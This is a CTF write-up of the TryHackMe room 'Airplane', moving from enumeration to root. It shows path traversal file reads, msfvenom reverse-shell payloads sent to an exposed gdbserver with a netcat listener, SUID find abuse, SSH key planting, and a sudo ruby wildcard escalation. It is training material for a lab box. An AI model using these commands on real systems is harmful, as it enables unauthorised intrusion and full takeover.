---
title: "Airplane"
date: 2025-01-23
image: /assets/img/tryhackme/Airplane/Airplane_image.jpg
description: Writeup of the TryHackMe-CTF Airplane
categories: [TryHackMe, Medium]
tags: [linux]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Airplane</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Are you ready to fly?</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Medium</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/airplane">https://tryhackme.com/room/airplane</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Airplane.  

## Enumeration
I started the enumeration using `nmap`:
```bash
kali@kali:~/ctf/airplane$ nmap -p- 10.10.104.147            
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-27 09:30 EDT
  Nmap scan report for 10.10.104.147
  Host is up (0.047s latency).
  Not shown: 65532 closed tcp ports (conn-refused)
  PORT     STATE SERVICE
  22/tcp   open  ssh
  6048/tcp open  x11
  8000/tcp open  http-alt

  Nmap done: 1 IP address (1 host up) scanned in 32.61 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
kali@kali:~/ctf/airplane$ nmap -A -p 22,6048,8000 10.10.104.147
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-27 09:31 EDT
  Nmap scan report for 10.10.104.147
  Host is up (0.038s latency).
  PORT     STATE SERVICE  VERSION
  22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 (RSA)
  |   256 ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 (ECDSA)
  |_  256 a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 (ED25519)
  6048/tcp open  x11?
  8000/tcp open  http-alt Werkzeug/3.0.2 Python/3.8.10
  | fingerprint-strings: 
  |   FourOhFourRequest: 
  |     HTTP/1.1 404 NOT FOUND
  |     Server: Werkzeug/3.0.2 Python/3.8.10
  |     Date: Thu, 27 Mar 2025 13:31:23 GMT
  |     Content-Type: text/html; charset=utf-8
  |     Content-Length: 207
  |     Connection: close
  |     <!doctype html>
  |     <html lang=en>
  |     <title>404 Not Found</title>
  |     <h1>Not Found</h1>
  |     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
  |   GetRequest: 
  |     HTTP/1.1 302 FOUND
  |     Server: Werkzeug/3.0.2 Python/3.8.10
  |     Date: Thu, 27 Mar 2025 13:31:18 GMT
  |     Content-Type: text/html; charset=utf-8
  |     Content-Length: 269
  |     Location: http://airplane.thm:8000/?page=index.html
  |     Connection: close
  |     <!doctype html>
  |     <html lang=en>
  |     <title>Redirecting...</title>
  |     <h1>Redirecting...</h1>
  |     <p>You should be redirected automatically to the target URL: <a href="http://airplane.thm:8000/?page=index.html">http://airplane.thm:8000/?page=index.html</a>. If not, click the link.
  |   Socks5: 
  |     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
  |     "http://www.w3.org/TR/html4/strict.dtd">
  |     <html>
  |     <head>
  |     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
  |     <title>Error response</title>
  |     </head>
  |     <body>
  |     <h1>Error response</h1>
  |     <p>Error code: 400</p>
  |     <p>Message: Bad request syntax ('
  |     ').</p>
  |     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
  |     </body>
  |_    </html>
  |_http-title: Did not follow redirect to http://airplane.thm:8000/?page=index.html
  |_http-server-header: Werkzeug/3.0.2 Python/3.8.10
```
From here I proceeded the analysis port by port.

## Port 8000 Analysis

The webserver redirected me to `airplane.thm`, so I added the domain to my hosts file. The page displayed some historical information about airplanes, which didn't seem useful. The URL caught my attention because of the `page` parameter, which had the value of an HTML file likely inside the webserver directory:
```html
http://airplane.thm:8000/?page=index.html
```

This could be vulnerable to path traversal, so I attempted to read the `/etc/passwd` file and was successful:
```bash
kali@kali:~/ctf/airplane$ curl http://airplane.thm:8000/?page=../../../../../../../../../../etc/passwd
  root:x:0:0:root:/root:/bin/bash
  [...]
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  [...]
  carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
  [...]
  hudson:x:1001:1001::/home/hudson:/bin/bash
  [...]
```

Great! I was able to read arbitrary files, so I tried to enumerate the system and read known files like Bash histories and SSH keys but was unsuccessful. After researching the Python Werkzeug web application, I got a list of default files to try reading. After analyzing the source code, this didn't reveal anything useful, so I moved on to the next port.

## Port 6048 Analysis

Since the nmap output didn't revealed anything useful about this port, I needed a way to gain more information. The `/proc/[PID]/cmdline` returns the running service name of that PID, so I used this for further enumeration:
```bash
kali@kali:~/ctf/airplane$ curl http://airplane.thm:8000/?page=../../../../../../../../../proc/1/cmdline --output -
  /sbin/initsplash
```

To automate this, I wrote a small bash script, executed it, and redirected the output to a file:
```bash
kali@kali:~/ctf/airplane$ cat proc_search.sh
  #!/bin/bash

  for i in {300..600}; do
      response=$(curl -s "http://airplane.thm:8000/?page=../../../../../../../../../proc/${i}/cmdline" --output -)
      echo "pid: $i service: $response"
  done
kali@kali:~/ctf/airplane$ ./proc_search.sh > output 
```

When there wasn't a proc entry for the PID, the webserver responded with `Page not found`, this helped me filter the output using grep's `-v` flag:
```bash
kali@kali:~/ctf/airplane$ grep -v "Page not found" output
  [...]
  pid: 527 service: /usr/bin/gdbserver0.0.0.0:6048airplane
  [...]
```

The output showed that it was a GDB server.

## Shell as hudson

While researching exploitable ways to use the GDB server, I found two interesting possibilities and wanted to try them both:

### Python Exploit

The first exploit I found was an <a href="https://www.exploit-db.com/exploits/50539">Exploit-DB</a> entry and a Python script. Before executing the exploit, I needed to create a reverse shell executable and start a Netcat listener: 
```bash
kali@kali:~/ctf/airplane$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=[attacker-ip] LPORT=4444 PrependFork=true -o rev.bin

kali@kali:~/ctf/airplane$ python3 exploit.py airplane.thm:6048 rev.bin
  [+] Connected to target. Preparing exploit
  [+] Found x64 arch
  [+] Sending payload
  [*] Pwned!! Check your listener

kali@kali:~/ctf/airplane$ nc -nlvp 4444  
  listening on [any] 4444 ...
  connect to [attacker-ip] from (UNKNOWN) [10.10.104.147] 49048
  id
  uid=1001(hudson) gid=1001(hudson) groups=1001(hudson)
```

### GDB binary

The second method I discovered in a <a href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-remote-gdbserver.html?highlight=gdbserver#pentesting-remote-gdbserver">Hacktricks</a> blog entry was by using the GBD executable. GDB has the ability to run a file on a remote GDB server, which can be exploited by uploading and executing a reverse shell. I started again with a Netcat listener and created a payload. 
```bash
$ nc -lnvp 4444

$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.21.63.26 LPORT=4444 PrependFork=true -f elf -o binary.elf

$ chmod +x binary.elf  
```

After this I started GDB with the binary and targeted the server as my remote machine. I encountered a permission denied error for the upload, but by specifying the destination inside `/tmp`, I was able to upload the file. After executing the binary, I received my reverse shell:
```bash
$ gdb binary.elf
  (gdb) target extended-remote 10.10.104.147:6048
    Remote debugging using 10.10.104.147:6048
  (gdb) remote put binary.elf binary.elf
    Remote I/O error: Permission denied
  (gdb) remote put binary.elf /tmp/binary.elf
    Successfully sent file "binary.elf".
  (gdb) set remote exec-file /tmp/binary.elf
  (gdb) run
    Starting program: /home/kali/ctf/airplane/binary.elf 
    [Detaching after fork from child process 29006]
    [Inferior 1 (process 29004) exited normally]

hudson@airplane:/opt$ id
  uid=1001(hudson) gid=1001(hudson) groups=1001(hudson)
```

## Privilege Escalation carlos

While enumerating the system for privilege escalation, I discovered that the SUID bit was set for the `find` executable:
```bash
hudson@airplane:/home/hudson$ find / -perm /4000 -type f 2>/dev/null
  [...]
  /usr/bin/find
  [...]
```

A quick search on <a href="https://gtfobins.github.io/gtfobins/find/#suid">gftobins</a> gave me all I needed:
```bash
hudson@airplane:/home/hudson$ /usr/bin/find . -exec /bin/sh -p \; -quit
$ id
  id=1001(hudson) gid=1001(hudson) euid=1000(carlos) groups=1001(hudson)
$ cat user.txt
  e[removed]2
```

This shell wasn't comfortable, and stabilization techniques didn't work. I generated a new SSH key pair on my local machine, inserted it in carlos `authorized_keys`, and was able to log in via SSH:
```bash
kali@kali:~/ctf/airplane$ ssh-keygen -t rsa    
  Generating public/private rsa key pair.
  Enter file in which to save the key (/home/kali/.ssh/id_rsa): /home/kali/ctf/airplane/id_rsa
  Enter passphrase (empty for no passphrase): 
  Enter same passphrase again: 
  Your identification has been saved in /home/kali/ctf/airplane/id_rsa
  Your public key has been saved in /home/kali/ctf/airplane/id_rsa.pub
  The key fingerprint is:
  SHA256:Y...Y kali@kali
  The key's randomart image is:
  +---[RSA 3072]----+
  |      +o+o o=    |
  |     .+ooE.= . . |
  |     . =* = . o  |
  |      oo   o . +.|
  |     .+.S   = ..+|
  |     ...   = + ..|
  |          = + o o|
  |           + + *+|
  |            . ooB|
  +----[SHA256]-----+#

kali@kali:~/ctf/airplane$ chmod 600 id_rsa

$ echo "ssh-rsa [public-key] kali@kali" > /home/carlos/.ssh/authorized_keys

kali@kali:~/ctf/airplane$ ssh -i id_rsa carlos@10.10.104.147
```

## Privilege Escalation root
I continued with `sudo -l` and got the following output:
```bash
carlos@airplane:~$ sudo -l
  Matching Defaults entries for carlos on airplane:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User carlos may run the following commands on airplane:
      (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

The user carlos was able to run a Ruby script with root permissions. Interestingly, the wildcard allowed me to specify any Ruby script. To exploit this, I created a small Ruby script, executed it, and was able to retrieve the root flag:
```bash
carlos@airplane:~$ echo 'system("/bin/bash")' > shell.rb
carlos@airplane:~$ sudo /usr/bin/ruby /root/../home/carlos/shell.rb 
root@airplane:/home/carlos# id
  uid=0(root) gid=0(root) groups=0(root)

root@airplane:~# cat /root/root.txt
  1[removed]2
```

solved! :)